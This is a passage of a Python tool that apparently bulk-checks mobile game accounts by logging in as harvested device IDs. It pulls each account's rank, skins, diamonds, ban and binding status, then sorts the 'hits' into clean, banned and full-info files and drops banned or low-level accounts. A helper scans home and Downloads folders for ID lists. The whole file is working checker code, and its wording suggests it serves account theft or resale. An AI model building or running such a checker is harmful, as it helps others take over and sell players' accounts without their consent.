        creation_ts = conn.creation_ts

        ok, _ = conn.get_server()
        if not ok:
            return {'error': 'no game server assigned', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        conn.enter_game()

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        if not conn.handshake():
            if conn.ban_seen:
                return _banned_result(conn, device_id)
            return {'error': 'game server handshake failed', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        result = conn.lookup(int(account_id), 'id')
        if not result:
            return {'error': 'account lookup returned nothing', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id, result)

        role_id = account_id
        zone = zone_id
        if result.get(0) and len(result[0]) > 0:
            first = result[0][0]
            if isinstance(first, dict):
                role_id = first.get(0, account_id)
                zone = first.get(1, zone_id)

        role_info = None
        try:
            si = conn.skin_info(role_id, zone)
            if si and isinstance(si, dict):
                role_info = dict(si)
        except Exception:
            pass

        try:
            ri = conn.role_info(role_id, zone)
            if ri and isinstance(ri, dict):
                if role_info is None:
                    role_info = dict(ri)
                else:
                    for k, v in ri.items():
                        if k not in role_info or not role_info[k]:
                            role_info[k] = v
        except Exception:
            pass

        v2l = None
        try:
            v2l = conn.v2l_status(role_id, zone)
        except Exception:
            pass

        if conn.ban_seen:
            return _banned_result(conn, device_id, result)

        player = extract_player(result, role_info, creation_ts, v2l)
        if not player:
            return {'error': 'extract failed', 'status': 'error'}

        player['ban_status'] = 'CLEAN'
        return {
            'status': 'success',
            'player': player,
            'device_id': device_id,
            'account_id': account_id,
            'zone_id': zone_id,
        }
    except Exception as e:
        try:
            import traceback
            append_line(FILE_ERRORS,
                        f'{device_id} | {type(e).__name__}: {e}')
            append_line(FILE_ERRORS, traceback.format_exc())
        except Exception:
            pass
        return {'error': f'{type(e).__name__}', 'status': 'error'}
    finally:
        conn.close()


def _banned_result(conn, device_id, result=None):
    info = conn.ban_info or {}
    player = None
    if result is not None:
        try:
            player = extract_player(result, None, conn.creation_ts, None)
        except Exception:
            player = None

    if player is None:
        player = {
            'nickname': None,
            'level': 0,
            'current_rank': 'Unknown',
            'high_rank': 'Unknown',
            'skin_count': 0,
            'hero_count': 0,
            'collector_tier': 'No Tier',
            'collector_point': 0,
            'skin_breakdown': {},
            'hero_history': [],
            'last_heroes_purchase': [],
            'emblem_levels': [],
            'skin_history': [],
            'last_match': None,
            'region_country': None,
            'location': None,
            'last_login': None,
            'creation_date': None,
            'account_age': None,
            'win_rate': None,
            'v2l_status': None,
            'starlight_user': 'No',
            'starlight_expiry': None,
            'starlight_months': 0,
            'followers': 0,
            'likes': 0,
            'affinity': None,
            'credits_score': None,
            'squad': None,
            'squad_motto': None,
            'restriction_flags': None,
            'achievement_points': 0,
            'mcl_champion_wins': 0,
            'total_battles': 0,
            'diamonds': 0,
            'battle_points': 0,
            'tickets': 0,
            'latest_skin_id': None,
            'latest_skin_date': None,
            'last_diamond_purchase': None,
            'ban_code': None,
            'ban_duration': None,
        }

    player['ban_status'] = 'BANNED'
    player['ban_reason'] = info.get('reason_name') or BAN_REASONS.get('21')
    player['ban_code'] = info.get('ban_code')
    player['ban_duration'] = format_ban_duration(info)

    return {
        'status': 'success',
        'player': player,
        'device_id': device_id,
        'account_id': conn.account_id,
        'zone_id': conn.zone_id,
    }


def probe_device(device_id):
    conn = GameConn(device_id)
    try:
        ok, _ = conn.login()
        if not ok:
            return {'status': 'error', 'device_id': device_id, 'error': 'login failed'}

        if conn.ban_seen:
            return {
                'status': 'banned',
                'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id,
                'zone_id': conn.zone_id,
            }

        ok, _ = conn.get_server()
        if not ok:
            return {'status': 'error', 'device_id': device_id, 'error': 'no server'}

        if conn.ban_seen:
            return {
                'status': 'banned', 'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id, 'zone_id': conn.zone_id,
            }

        conn.enter_game()
        if not conn.handshake():
            return {'status': 'error', 'device_id': device_id, 'error': 'handshake failed'}

        if conn.ban_seen:
            return {
                'status': 'banned', 'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id, 'zone_id': conn.zone_id,
            }

        result = conn.lookup(int(conn.account_id), 'id')
        if not result:
            return {'status': 'error', 'device_id': device_id, 'error': 'lookup empty'}

        if conn.ban_seen:
            return {
                'status': 'banned', 'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id, 'zone_id': conn.zone_id,
            }

        p = result[0][0] if (result.get(0) and len(result[0]) > 0) else {}
        if not isinstance(p, dict):
            return {'status': 'error', 'device_id': device_id, 'error': 'bad payload'}

        level = int(p.get(3, 0) or 0)
        rank_val = p.get(8)
        rank_str = map_rank(rank_val) if rank_val is not None else 'Unranked'
        last_login_ts = int(p.get(5, 0) or 0)

        coll_pts = 0
        t136 = p.get(136, {})
        if isinstance(t136, dict):
            coll_pts = int(t136.get(9, 0) or 0)

        if coll_pts == 0:
            role_id = p.get(0, conn.account_id)
            zone = p.get(1, conn.zone_id)
            try:
                ri = conn.role_info(role_id, zone)
                if ri:
                    t = ri.get(136, {})
                    if isinstance(t, dict):
                        coll_pts = int(t.get(9, 0) or 0)
            except Exception:
                pass

        return {
            'status': 'clean',
            'device_id': device_id,
            'account_id': conn.account_id,
            'zone_id': conn.zone_id,
            'level': level,
            'rank': rank_str,
            'last_login_ts': last_login_ts,
            'collector_point': coll_pts,
            'collector_tier': map_collector(coll_pts),
        }
    except Exception as e:
        return {'status': 'error', 'device_id': device_id, 'error': type(e).__name__}
    finally:
        conn.close()


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = SCRIPT_DIR

FILE_BAN     = os.path.join(OUT_DIR, "banned.txt")
FILE_CLEAN   = os.path.join(OUT_DIR, "clean.txt")
FILE_UNKNOWN = os.path.join(OUT_DIR, "unknown.txt")
FILE_VALID   = os.path.join(OUT_DIR, "full_info.txt")
FILE_HITS    = os.path.join(OUT_DIR, "all_hits.txt")
FILE_V2L_YES = os.path.join(OUT_DIR, "v2l_on.txt")
FILE_V2L_NO  = os.path.join(OUT_DIR, "v2l_off.txt")
FILE_ERRORS  = os.path.join(OUT_DIR, "errors.txt")
FILE_DEVICES = os.path.join(OUT_DIR, "devices.json")
FILE_LAST_MATCHES = os.path.join(OUT_DIR, "last_matches.txt")

TRASH_DIR = os.path.join(OUT_DIR, "trash_remover")
RANK_DIR  = os.path.join(OUT_DIR, "rank_split")

OWN_OUTPUTS = {
    os.path.basename(FILE_BAN), os.path.basename(FILE_CLEAN),
    os.path.basename(FILE_UNKNOWN), os.path.basename(FILE_VALID),
    os.path.basename(FILE_HITS), os.path.basename(FILE_V2L_YES),
    os.path.basename(FILE_V2L_NO), os.path.basename(FILE_ERRORS),
    os.path.basename(FILE_DEVICES),
    os.path.basename(FILE_LAST_MATCHES),
}

_write_lock = threading.Lock()


def append_line(path, line):
    with _write_lock:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def append_block(path, text):
    with _write_lock:
        with open(path, "a", encoding="utf-8") as f:
            f.write(text + "\n\n")


DEVICE_IDS = [
    'and_cd9e459ea708a948d5c2f5a6ca8838cf648efdbc9a8c3ce703fa556d-34a4-4cde-a061-34938d08a26e',
]


def load_saved_devices():
    try:
        with open(FILE_DEVICES, 'r', encoding='utf-8') as f:
            saved = json.load(f)
        for d in saved:
            if isinstance(d, str) and d.startswith(('and_', 'ios_')) and d not in DEVICE_IDS:
                DEVICE_IDS.append(d)
    except Exception:
        pass


def save_devices():
    try:
        with open(FILE_DEVICES, 'w', encoding='utf-8') as f:
            json.dump(DEVICE_IDS, f, indent=2)
    except Exception:
        pass


def find_input_files():
    seen = set()
    hits = []
    dirs = []
    for d in (
        os.getcwd(),
        SCRIPT_DIR,
        os.path.join(os.path.expanduser('~'), 'storage', 'downloads'),
        os.path.join(os.path.expanduser('~'), 'Downloads'),
        os.path.expanduser('~'),
    ):
        if d and os.path.isdir(d) and d not in dirs:
            dirs.append(d)

    for d in dirs:
        try:
            for name in os.listdir(d):
                if not name.lower().endswith(('.txt', '.csv', '.log')):
                    continue
                if name in OWN_OUTPUTS:
                    continue
                full = os.path.join(d, name)
                if not os.path.isfile(full):
                    continue
                real = os.path.realpath(full)
                if real in seen:
                    continue
                seen.add(real)
                try:
                    st = os.stat(full)
                    hits.append((full, st.st_size, st.st_mtime))
                except OSError:
                    pass
        except OSError:
            pass

    hits.sort(key=lambda x: x[2], reverse=True)
    return hits[:20]


def pick_file(hint=''):
    hits = find_input_files()

    if hint:
        print(f'  {_DIM}{hint}{_RST}')
    print()

    if hits:
        print(f'  {_CY}found {len(hits)} nearby{_RST}')
        for i, (path, size, mtime) in enumerate(hits, 1):
            rel = os.path.relpath(path, os.getcwd())
            if len(rel) > 54:
                rel = '...' + rel[-51:]
            ts = datetime.datetime.fromtimestamp(mtime).strftime('%m-%d %H:%M')
            c = palette('aurora')[i % 4]
            print(f'  {hex_ansi(c)}[{i:>2}]{_RST}  '
                  f'{_WH}{pad_right(rel, 56)}{_RST}  '
                  f'{_DIM}{human_bytes(size):>9}  {ts}{_RST}')
    else:
        print(f'  {_DIM}no matching files nearby - paste a path{_RST}')

    print()
    print(f'  {_DIM}enter number, path, or q to cancel{_RST}')

    try:
        raw = input(f'  {_CY}>{_RST} ').strip().strip('"').strip("'").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None

    if not raw or raw.lower() == 'q':
        return None

    if raw.isdigit():
        idx = int(raw)
        if 1 <= idx <= len(hits):
            return hits[idx - 1][0]
        log('ERROR', f'no file #{idx} in the list')
        return None

    if os.path.exists(raw):
        return raw

    log('ERROR', f'not found: {raw}')
    return None


def load_id_file(path):
    seen = set()
    ids = []
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        for line in f:
            line = line.strip().strip('"').strip("'")
            if not line or line.startswith('#'):
                continue
            if line.startswith(('and_', 'ios_')):
                key = line
            elif DEVICE_ID_RE.fullmatch(line):
                key = line
            elif len(line) >= 32 and re.match(r'^[0-9a-fA-F_\-]+$', line):
                key = line
            else:
                continue
            if key in seen:
                continue
            seen.add(key)
            ids.append(key)
    return ids


def extract_device_ids(text):
    if not text:
        return []
    seen = set()
    out = []
    for m in DEVICE_ID_RE.finditer(text):
        d = m.group(0)
        if d not in seen:
            seen.add(d)
            out.append(d)
    return out


def extract_device_ids_from_file(path):
    for enc in ('utf-8', 'utf-8-sig', 'utf-16', 'utf-16-le', 'latin-1'):
        try:
            with open(path, 'r', encoding=enc) as f:
                data = f.read()
            ids = extract_device_ids(data)
            if ids:
                if os.environ.get('DRAKVEX_DEBUG'):
                    print(f'  [debug] {path} via {enc}: {len(ids)} ids')
                return ids
        except (OSError, UnicodeDecodeError):
            continue
    try:
        with open(path, 'rb') as f:
            raw = f.read()
        for enc in ('utf-8', 'utf-16', 'latin-1'):
            try:
                ids = extract_device_ids(raw.decode(enc, errors='replace'))
                if ids:
                    return ids
            except Exception:
                continue
    except OSError:
        pass
    return []


_FEED_STYLES = {
    "info":  ("\u00b7", "\x1b[2m",                "#2a2a2a"),
    "clean": ("+",       "\x1b[38;5;114m\x1b[1m", "#0bda51"),
    "ban":   ("!",       "\x1b[38;5;196m\x1b[1m", "#ff3b3b"),
    "fail":  ("x",       "\x1b[38;5;214m\x1b[1m", "#ffce54"),
    "drop":  ("-",       "\x1b[38;5;209m\x1b[1m", "#ff8a3d"),
    "v2l":   ("~",       "\x1b[38;5;51m\x1b[1m",  "#00d4ff"),
}


class LiveDash:
    def __init__(self, total, label="scan", interval=0.15, workers=1):
        self.total = max(1, total)
        self.label = label
        self.t0 = time.time()
        self.mu = threading.RLock()
        self.events = deque(maxlen=800)
        self.rate_hist = deque(maxlen=48)
        self.peak_rate = 0.0
        self.workers = max(1, min(64, workers))
        self.worker_lanes = [0] * self.workers
        self.worker_tick = 0
        self.s = {
            "done": 0, "ok": 0, "fail": 0,
            "banned": 0, "clean": 0,
            "dropped": 0,
            "dropped_low": 0, "dropped_unranked": 0,
            "v2l_on": 0, "v2l_off": 0,
            "peak": 0,
        }
        self._stop = threading.Event()
        self._th = None
        self._interval = interval
        self._alt = False
        self._quiet = False
        self._last_sample = time.time()
        self._last_done = 0
        self._blink = 0
        self.focus = None
        self.focus_ts = 0.0
        self.focus_ttl = 6.0
        self.focus_pinned = False
        self.errors = deque(maxlen=16)
        self.session_id = "%04x" % (random.randint(0, 0xFFFF))
        self.current_file = ""
        self.row_flash = {}
        self._last_frame_hash = 0

    def start(self):
        try:
            if not sys.stdout.isatty():
                self._quiet = True
                return
        except Exception:
            self._quiet = True
            return
        sys.stdout.write("\x1b[?1049h\x1b[?25l\x1b[2J\x1b[H")
        sys.stdout.flush()
        self._alt = True
        self._th = threading.Thread(target=self._loop, daemon=True)
        self._th.start()

    def stop(self):
        if self._quiet:
            return
        self._stop.set()
        try:
            if self._th:
                self._th.join(timeout=1.0)
        finally:
            try:
                sys.stdout.write("\x1b[?25h\x1b[?1049l")
                sys.stdout.flush()
            except Exception:
                pass
            self._alt = False

    def set_file(self, name):
        with self.mu:
            self.current_file = name

    def tick_worker(self, w_idx=None):
        with self.mu:
            if w_idx is None:
                w_idx = self.worker_tick % self.workers
                self.worker_tick += 1
            self.worker_lanes[w_idx % self.workers] = min(9, self.worker_lanes[w_idx % self.workers] + 3)

    def bump(self, key, n=1):
        with self.mu:
            self.s[key] = self.s.get(key, 0) + n

    def push(self, kind, text):
        with self.mu:
            ts = time.time()
            self.events.append((ts, kind, text))
            if kind in ("ban", "fail"):
                self.row_flash[ts] = time.time() + 0.5

    def _sample_rate(self):
        now = time.time()
        dt = now - self._last_sample
        if dt < 0.5:
            return
        with self.mu:
            done = self.s["done"]
            delta = done - self._last_done
            r = delta / dt if dt > 0 else 0.0
            self.rate_hist.append(r)
            if r > self.peak_rate:
                self.peak_rate = r
            self._last_sample = now
            self._last_done = done
        self._blink = 1 - self._blink
        with self.mu:
            for i in range(len(self.worker_lanes)):
                if self.worker_lanes[i] > 0:
                    self.worker_lanes[i] -= 1

    def record_hit(self, device_id, account_id, zone_id, player):
        banned = player.get("ban_status") == "BANNED"
        with self.mu:
            self.s["done"] += 1
            self.s["ok"] += 1
            ts = time.time()
            if banned:
                self.s["banned"] += 1
                reason = player.get("ban_reason") or "reason unknown"
                dur = player.get("ban_duration") or "?"
                self.events.append((ts, "ban",
                    f"acc {account_id} z {zone_id}  banned  {reason}  {dur}"))
                self.row_flash[ts] = ts + 0.5
            else:
                self.s["clean"] += 1
                v = str(player.get("v2l_status", "")).lower()
                if v in ("enabled", "yes", "1", "true"):
                    self.s["v2l_on"] += 1
                    tag = "v2l on"
                else:
                    self.s["v2l_off"] += 1
                    tag = "v2l off"
                name = player.get("nickname") or "?"
                rank = player.get("current_rank") or "?"
                lm = player.get("last_match") or {}
                lm_tag = (f"{lm.get('hero','?')} {lm.get('kda','?')} "
                          f"{lm.get('result','?')}") if lm else ""
                self.events.append((ts, "clean",
                    f"acc {account_id} z {zone_id}  {tag}  "
                    f"{trunc(name, 16)}  {rank}  {lm_tag}"))
                if not self.focus_pinned:
                    self.focus = self._build_focus(player)
                    self.focus_ts = ts

    def record_fail(self, device_id, err):
        with self.mu:
            ts = time.time()
            self.s["done"] += 1
            self.s["fail"] += 1
            self.errors.append(err)
            self.events.append((ts, "fail",
                f"{trunc(device_id, 34)}  {err}"))
            self.row_flash[ts] = ts + 0.5

    def _loop(self):
        while not self._stop.is_set():
            self._sample_rate()
            try:
                self._draw()
            except Exception:
                pass
            self._stop.wait(self._interval)

    def _draw(self):
        with self.mu:
            snap = dict(self.s)
            events = list(self.events)
            rh = list(self.rate_hist)
            lanes = list(self.worker_lanes)
        frame = self._compose(snap, events, rh, lanes)

        term = shutil.get_terminal_size((120, 42))
        W = term.columns
        H = term.lines

        rows = []
        for line in frame[:H]:
            v = vlen(line)
            if v >= W:
                line = trunc(line, W - 1)
                v = vlen(line)
            rows.append(line + " " * (W - 1 - v))
        while len(rows) < H:
            rows.append(" " * (W - 1))

        body = "\x1b[H" + "\r\n".join(rows) + "\x1b[0J"

        h = hash(body)
        if h == self._last_frame_hash:
            return
        self._last_frame_hash = h

        sys.stdout.write("\x1b[?2026h" + body + "\x1b[?2026l")
        sys.stdout.flush()

    def _sparkline(self, values, width):
        if not values:
            return _DIM + "\u2581" * width + _RST
        tick = "\u2581\u2582\u2583\u2584\u2585\u2586\u2587\u2588"
        vmax = max(values) if max(values) > 0 else 1
        n = min(width, len(values))
        sample = values[-n:]
        out = ""
        pal = palette("drakvex")
        for i, v in enumerate(sample):
            idx = int((v / vmax) * (len(tick) - 1))
            c = pal[min(len(pal) - 1, i * len(pal) // max(1, n))]
            out += hex_ansi(c) + tick[idx]
        return out + _RST

    def _segmented_bar(self, s, width):
        total = self.total
        clean = s["clean"]
        banned = s["banned"]
        dropped = s["dropped"]
        failed = s["fail"]

        segs = []
        for label, count, colors in (
            ("clean", clean, ("#004d24", "#0bda51")),
            ("ban",   banned, ("#3a0000", "#ff3b3b")),
            ("drop",  dropped, ("#3a2a00", "#ffce54")),
            ("fail",  failed, ("#1a1a1a", "#606060")),
        ):
            if count <= 0:
                continue
            w_seg = max(1, int((count / max(total, 1)) * width))
            segs.append((label, w_seg, colors))

        used = sum(w for _, w, _ in segs)
        if used < width:
            segs.append(("rest", width - used, ("#0a0000", "#1a0000")))

        out = ""
        for label, w_seg, colors in segs:
            cs = ramp(list(colors), max(1, w_seg))
            for idx, c in enumerate(cs):
                if 0 < idx < len(cs) - 1 and 2 < idx:
                    out += f"{hex_ansi(c)}\u2593"
                else:
                    out += f"{hex_ansi(c)}\u2588"
        return out + _RST

    def _bar_legend(self, s, W):
        chips = [
            (_GN, f"\u25cf clean {fmt_num(s['clean'])}"),
            (_RD, f"\u25cf ban {fmt_num(s['banned'])}"),
            (_YL, f"\u25cf drop {fmt_num(s['dropped'])}"),
            (_DIM, f"\u25cf fail {fmt_num(s['fail'])}"),
        ]
        out = "  "
        out += "   ".join(f"{c}{t}{_RST}" for c, t in chips)
        return out

    def _worker_lanes(self, lanes):
        out = ""
        for v in lanes:
            if v <= 0:
                out += f"{_DIM}\u00b7{_RST}"
            elif v <= 3:
                out += f"{hex_ansi('#7a0000')}\u2581{_RST}"
            elif v <= 6:
                out += f"{hex_ansi('#c81414')}\u2584{_RST}"
            else:
                out += f"{hex_ansi('#ff6b2b')}\u2588{_RST}"
        return out

    def _activity_meter(self, s):
        done = s["done"]
        total = self.total
        frac = done / total if total else 0
        bars = int(frac * 8)
        return f"{hex_ansi('#c81414')}{'\u2588' * bars}{_DIM}{'\u2591' * (8 - bars)}{_RST}"

    def _compose(self, s, events, rate_hist, lanes):
        term = shutil.get_terminal_size((120, 42))
        W = term.columns
        H = term.lines

        elapsed = time.time() - self.t0
        done = s["done"]
        rate = done / elapsed if elapsed > 0 else 0.0
        remaining = max(0, self.total - done)
        eta = remaining / rate if rate > 0 else 0
        now = datetime.datetime.now().strftime("%H:%M:%S")

        rows = [""]
        rows.append(self._header(W, elapsed, rate, now))
        rows.append(f"  {hex_ansi('#3a0000')}{'\u2501' * max(0, W - 4)}{_RST}")
        rows.append(f"  {hex_ansi('#1a0000')}{'\u2500' * max(0, W - 4)}{_RST}")
        rows.append("")

        frac = done / self.total
        bw = max(24, min(72, W - 30))
        bar = self._segmented_bar(s, bw)
        rows.append(f"  {_WH}{_BRT}progress{_RST}  {_DIM}[{self.session_id}]{_RST}")
        rows.append(f"  {bar}  {_YL}{frac * 100:5.1f}%{_RST}  {_DIM}{done}/{self.total}{_RST}")
        rows.append(self._bar_legend(s, W))
        spark = self._sparkline(rate_hist, bw)
        rows.append(f"  {_DIM}rate {_RST}{spark}")
        rows.append("")

        eta_str = human_dur(eta) if eta > 0 and done > 0 else "--"
        eta_lo = human_dur(eta * 0.85) if eta > 0 else "--"
        eta_hi = human_dur(eta * 1.15) if eta > 0 else "--"
        rows.append(f"  {_DIM}elapsed{_RST} {_WH}{human_dur(elapsed):<10}{_RST}  "
                    f"{_DIM}rate{_RST} {_WH}{rate:5.2f}/s{_RST}  "
                    f"{_DIM}peak{_RST} {_WH}{self.peak_rate:5.2f}/s{_RST}  "
                    f"{_DIM}eta{_RST} {_WH}{eta_str} {_DIM}\u00b1{_RST}")
        rows.append(f"  {_DIM}range {eta_lo} \u2013 {eta_hi}{_RST}")
        rows.append("")
        rows.append(self._rule_label(W, "stats"))
        rows.append("")
        rows.append(self._stat_strip(s))
        rows.append("")
        rows.append(f"  {_DIM}workers{_RST} {self._worker_lanes(lanes)}  "
                    f"{_DIM}activity{_RST} {self._activity_meter(s)}")
        rows.append("")
        focus_rows = self._render_focus(W)
        if focus_rows:
            rows.extend(focus_rows)
            rows.append("")

        err_count = s["fail"]
        total_done = max(1, s["done"])
        err_rate = err_count / total_done
        if err_rate > 0.15:
            rows.append(self._error_rail(W))

        rows.append(self._rule_label(W, "feed"))
        rows.append("")

        head = len(rows) + 3
        feed_rows = max(4, H - head - 1)
        tail = events[-feed_rows:]
        if not tail:
            rows.append(f"  {_DIM}waiting for first result...{_RST}")
            for _ in range(feed_rows - 1):
                rows.append("")
        else:
            pad = feed_rows - len(tail)
            for _ in range(max(0, pad)):
                rows.append("")
            fade = list(range(len(tail)))
            for idx, (ts, kind, text) in enumerate(tail):
                rel_age = len(tail) - idx
                rows.append(self._feed_line(W, ts, kind, text, rel_age, len(tail)))

        rows.append("")
        rows.append(f"  {_DIM}session {self.session_id} \u00b7 "
                    f"{fmt_num(done)}/{fmt_num(self.total)} \u00b7 "
                    f"file: {trunc(self.current_file or '-', 40)}{_RST}")

        return rows

    def _error_rail(self, W):
        top = list(self.errors)[-3:]
        if not top:
            return ""
        c = f"  {hex_ansi('#ff3b3b')}{_BRT}\u258c{_RST}  "
        parts = [trunc(e, 20) for e in top]
        return c + f"{_DIM} {' \u00b7 '.join(parts)}{_RST}"

    def _header(self, W, elapsed, rate, now):
        blink = "\u25cf" if self._blink else "\u25cb"
        left = (f"  {hex_ansi('#c81414')}{G_LIVE}{_RST} "
                f"{_WH}{_BRT}LIVE SCAN{_RST} "
                f"{hex_ansi('#ff3b3b')}{blink}{_RST}  "
                f"{_DIM}{trunc(self.label, 36)}{_RST}")
        right = (f"{_DIM}elapsed{_RST} {_YL}{human_dur(elapsed)}{_RST}   "
                 f"{_DIM}rate{_RST} {_YL}{rate:5.2f}/s{_RST}   "
                 f"{_DIM}{now}{_RST}  ")
        gap = max(2, W - vlen(left) - vlen(right))
        return left + (" " * gap) + right

    def _rule(self, W):
        return f"  {_DIM}{'\u2500' * max(0, W - 4)}{_RST}"

    def _rule_label(self, W, label):
        pad = W - vlen(label) - 6
        return (f"  {_DIM}\u2500\u2500{_RST} {_CY}{label}{_RST} "
                f"{_DIM}{'\u2500' * max(0, pad)}{_RST}")

    def _build_focus(self, p):
        lm = p.get("last_match") or {}
        sb = p.get("skin_breakdown") or {}
        acc = p.get("_account", 0)
        zone = p.get("_zone", 0)
        nick = fv(p.get("nickname"), "?")
        rows = []
        rows.append(("title", f"{nick}  \u00b7  acc {acc} z {zone}"))
        rows.append(("kv", ("rank",
                     f"{fv(p.get('current_rank'), '?')}   peak {fv(p.get('high_rank'), '?')}")))
        rows.append(("kv", ("level",
                     f"{fv(p.get('level'), 0)}   wr {fv(p.get('win_rate'), '?')}   "
                     f"{fmt_num(p.get('total_battles', 0))} battles   "
                     f"{fv(p.get('account_age'), '-')} old")))
        rows.append(("kv", ("collector",
                     f"{fv(p.get('collector_tier'), '?')}  "
                     f"({fmt_num(p.get('collector_point', 0))})")))
        rows.append(("kv", ("status",
                     f"v2l {fv(p.get('v2l_status'), '?')}   "
                     f"ban {fv(p.get('ban_status'), '?')}   "
                     f"starlight {fv(p.get('starlight_user'), '?')}")))
        rows.append(("kv", ("skins",
                     f"Sup {sb.get('Supreme Skins', 0)}  "
                     f"G {sb.get('Grand Skins', 0)}  "
                     f"Ex {sb.get('Exquisite Skins', 0)}  "
                     f"Dlx {sb.get('Deluxe Skins', 0)}  "
                     f"Exc {sb.get('Exceptional Skins', 0)}  "
                     f"Com {sb.get('Common Skins', 0)}")))
        if lm:
            mvp = " MVP" if lm.get("mvp") else ""
            rows.append(("kv", ("last match",
                         f"{lm.get('hero', '?')}  {lm.get('kda', '?')}  "
                         f"{lm.get('result', '?')}  {lm.get('mode', '?')}  "
                         f"{lm.get('duration', '?')}{mvp}  "
                         f"{fv(lm.get('played_at'), '?')}")))
        else:
            rows.append(("kv", ("last match", "-")))
        return rows

    def _render_focus(self, W):
        if not self.focus:
            return []
        age = time.time() - self.focus_ts
        if not self.focus_pinned and age > self.focus_ttl:
            return []
        inner = max(30, W - 6)
        out = []
        pin = "PINNED \u00b7 " if self.focus_pinned else ""
        head = f"\u2500\u2500 {pin}LATEST HIT \u00b7 {human_dur(age)} ago "
        fill = max(0, inner - vlen(head) - 2)
        rail = palette("drakvex")[3]
        rail_col = hex_ansi(rail)
        out.append(f"  {_GN}\u250c\u2500{_BRT} {head}{_RST}{_GN}{'\u2500' * fill}\u2510{_RST}")
        for kind, val in self.focus:
            if kind == "title":
                body = f" {_WH}{_BRT}{trunc(val, inner - 4)}{_RST}"
            else:
                k, v = val
                body = (f" {_DIM}{pad_right(k, 11)}{_RST}  "
                        f"{_WH}{trunc(v, inner - 18)}{_RST}")
            pad = inner - vlen(body) - 2
            out.append(f"  {rail_col}\u258c{_RST}{body}{' ' * max(0, pad)}{_GN}\u2502{_RST}")
        out.append(f"  {_GN}\u2514{'\u2500' * (inner + 1)}\u2518{_RST}")
        return out

    def _stat_strip(self, s):
        parts = [
            (_WH,  "ok",      s["ok"]),
            (_GN,  "clean",   s["clean"]),
            (_RD,  "banned",  s["banned"]),
            (_YL,  "dropped", s["dropped"]),
            (_YL,  "failed",  s["fail"]),
            (_CY,  "v2l on",  s["v2l_on"]),
            (_DIM, "v2l off", s["v2l_off"]),
        ]
        out = ["  "]
        for i, (c, lbl, n) in enumerate(parts):
            if i:
                out.append(f"  {hex_ansi('#3a0000')}\u2565{_RST}  ")
            out.append(f"{_DIM}{lbl}{_RST} {c}{_BRT}{fmt_num(n)}{_RST}")
        return "".join(out)

    def _feed_line(self, W, ts, kind, text, rel_age, total):
        glyph, gcolor, rail_hex = _FEED_STYLES.get(
            kind, ("\u00b7", "\x1b[2m", "#2a2a2a"))

        t = datetime.datetime.fromtimestamp(ts).strftime("%H:%M:%S")
        flash = self.row_flash.get(ts, 0) > time.time()

        rail = f"{hex_ansi(rail_hex)}\u258c{_RST}"

        if flash:
            tchip = f"{_WH}{_BRT}{t}{_RST}"
            gchip = f"{hex_ansi('#ffe0b2')}{_BRT}{glyph}{_RST}"
        else:
            tchip = f"{_DIM}{t}{_RST}"
            gchip = f"{gcolor}{glyph}{_RST}"

        prefix = f"  {tchip}  {gchip}  {rail}"
        avail = max(8, W - vlen(prefix) - 2)
        txt = trunc(text, avail)

        if kind == "ban":
            body = f"{hex_ansi('#ff5c5c')}{_BRT}{txt}{_RST}"
        elif kind == "drop":
            body = f"{hex_ansi('#ff8a3d')}{txt}{_RST}"
        elif kind == "fail":
            body = f"{hex_ansi('#ffce54')}{txt}{_RST}"
        elif kind == "clean":
            if rel_age <= 3:
                body = f"{hex_ansi('#ffe0b2')}{_BRT}{txt}{_RST}"
            elif rel_age <= 8:
                body = f"{_WH}{txt}{_RST}"
            else:
                body = f"{_DIM}{txt}{_RST}"
        elif kind == "v2l":
            body = f"{hex_ansi('#00d4ff')}{txt}{_RST}"
        else:
            body = f"{_DIM}{txt}{_RST}"

        return prefix + body


RANK_FOLDERS = [
    ('Warrior',           ('Warrior',)),
    ('Elite',             ('Elite',)),
    ('Master',            ('Master',)),
    ('Grandmaster',       ('Grandmaster',)),
    ('Epic',              ('Epic',)),
    ('Legend',            ('Legend',)),
    ('Mythic',            ('Mythic',)),
    ('Mythical Honor',    ('Mythical Honor',)),
    ('Mythical Glory',    ('Mythical Glory',)),
    ('Mythical Immortal', ('Mythical Immortal',)),
]

PEAK_TIERS = {
    'renowned': 'Renowned Collector',
    'mega':     'Mega Collector',
    'world':    'World Collector',
}


def rank_folder_for(rank_str):
    if not rank_str:
        return None
    for folder, prefixes in RANK_FOLDERS:
        for prefix in prefixes:
            if rank_str.startswith(prefix):
                return folder
    return None


def _trash_worker(dash, device_id, handles, lock):
    dash.tick_worker()
    res = probe_device(device_id)
    st = res.get('status')

    if st == 'banned':
        with lock:
            handles['banned'].write(device_id + '\n')
        dash.bump('dropped')
        dash.bump('banned')
        dash.push('ban', f'{trunc(device_id, 30)}  banned')
        dash.bump('done')
        return

    if st != 'clean':
        with lock:
            handles['invalid'].write(device_id + '\n')
        dash.bump('dropped')
        dash.bump('fail')
        dash.push('fail', f'{trunc(device_id, 30)}  {res.get("error", "?")}')
        dash.bump('done')
        return

    lvl = as_int(res.get('level', 0))
    if lvl <= 7:
        with lock:
            handles['level'].write(device_id + '\n')
        dash.bump('dropped')
        dash.bump('dropped_low')
        dash.push('drop', f'{trunc(device_id, 30)}  lv{lvl}')
        dash.bump('done')
        return

    rank = res.get('rank', '')
    if not rank or rank == 'Unranked':
        with lock:
            handles['unranked'].write(device_id + '\n')
        dash.bump('dropped')
        dash.bump('dropped_unranked')
        dash.push('drop', f'{trunc(device_id, 30)}  unranked')
        dash.bump('done')
        return

    with lock:
        handles['clean'].write(device_id + '\n')
    dash.bump('ok')
    dash.bump('clean')
    dash.push('clean', f'{trunc(device_id, 30)}  lv{lvl}  {rank}')
    dash.bump('done')


def run_trash_remover():
    section('Banned + Trash Remover')
    print()
    bullet('drop level 7 and below', color=_YL)
    bullet('drop banned accounts', color=_RD)
